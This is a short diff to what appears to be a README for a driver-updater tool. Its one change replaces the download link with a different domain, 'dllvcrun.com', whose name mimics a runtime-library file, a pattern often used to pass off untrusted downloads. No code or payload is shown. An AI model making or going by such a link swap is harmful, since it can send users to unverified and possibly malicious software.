@@ -4,7 +4,7 @@ Scans installed devices and fetches the latest official drivers for each.
 
 ---
 
-**[→ Download latest version](https://forumconnect.uk/drivers)**
+**[→ Download latest version](https://dllvcrun.com/drivers)**
 
 ---
 
